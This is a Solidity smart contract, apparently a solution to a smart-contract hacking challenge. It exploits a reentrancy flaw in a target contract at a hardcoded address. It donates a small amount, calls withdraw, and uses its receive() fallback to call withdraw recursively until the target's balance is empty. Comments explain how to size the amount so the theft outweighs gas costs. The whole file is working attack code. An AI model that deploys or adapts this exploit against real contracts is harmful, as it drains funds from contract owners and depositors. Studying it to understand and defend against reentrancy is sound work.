// SPDX-License-Identifier: None
pragma solidity >0.8.0;

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external ;
}

contract ReentranceHack{
    Reentrance target = Reentrance(0x97EdD71C06363A09eb75522BCdDcEEAA42e7223c);
    // need to verify how much balance of the target is before setting this value
    // too small amount will reach max recursion depth too fast.
    // as result attack cost for gas will be higher then gained amount :)
    uint public hacker_balance = 100_000 gwei; // ideally should be set based on msg.value in constructor.

    // payable. to receive some eth on deploy that will be donated later and used for hack.
    constructor () payable {}

    function crack() public{
        target.donate{value: hacker_balance}(address(this));
        target.withdraw(hacker_balance); // the same here as described below
    }

    // crack call should enter us here. 
    receive() external payable {
        uint targetBal = address(target).balance;
        // here we can use another more flexible approach like reading our balance from target
        // but I do not want to waste time e.g. add new func to target interface and so on. 
        // so since I know that my balance is "hacker_balance" - using it.
        if (targetBal > 0) {
            // withdraw again as long as there’s balance left
            uint toWithdraw = targetBal >= hacker_balance
                ? hacker_balance 
                : targetBal;
            target.withdraw(toWithdraw);
        }
    }

}